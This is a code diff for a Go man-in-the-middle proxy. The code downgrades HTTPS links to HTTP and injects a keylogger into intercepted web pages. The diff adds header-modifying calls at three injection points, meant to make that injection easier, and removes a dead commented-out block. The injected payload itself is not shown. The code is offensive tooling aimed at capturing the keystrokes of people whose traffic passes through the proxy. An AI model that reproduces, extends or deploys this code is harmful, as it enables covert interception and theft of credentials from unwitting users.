@@ -143,6 +143,7 @@ func StartSimpleProxy() net.Listener {
             body := string(bs) //needs to be a string for reading
             if globalInjectKeyLogger {
                 log.Println("INJECTING")
+                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
             }
             ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
@@ -226,7 +227,7 @@ func TriggerWolfPack() goproxy.HandlerFunc {
                 body := string(bs)
                 body = strings.Replace(body, "https", "http", -1)
                 if globalInjectKeyLogger {
-                    // log.Println("INJECTING")
+                    utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                     body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
                 }
                 // Create a response object from the body.
@@ -245,7 +246,7 @@ func TriggerWolfPack() goproxy.HandlerFunc {
                 // strip all https out of the page so that a redirect will be required if necessary
                 body = strings.Replace(body, "https", "http", -1)
                 if globalInjectKeyLogger {
-                    // log.Println("INJECTING")
+                    utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                     body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
                 }
                 ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
@@ -253,24 +254,6 @@ func TriggerWolfPack() goproxy.HandlerFunc {
             }
 
         } // end of 301-302 redirects.
-
-
-        // log.Println("neither of the above, we are forwarding data")
-        // if strings.Contains(ctx.Resp.Request.URL.Path, "js") { 
-        //     //catch javascript files to embed the hook into
-        //     log.Println("HTTP URL: ", ctx.Resp.Request.URL.Path)
-        // } else if strings.Contains(ctx.Resp.Request.URL.Path, "css") { 
-        //     //catch css and leave it alone
-        // } else { //must be an html file or a picture or whatever.
-        //     bs, err := ioutil.ReadAll(ctx.Resp.Body)
-        //     if err != nil {
-        //         log.Println(err)
-        //     }
-        //     body := string(bs)
-        //     body = strings.Replace(body, "https", "http", -1) //stip all https tags
-        //     //need to inject javascript aswell
-        //     ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
-        // }
 
         return goproxy.NEXT
     }) // end of the proxy OnResponse.
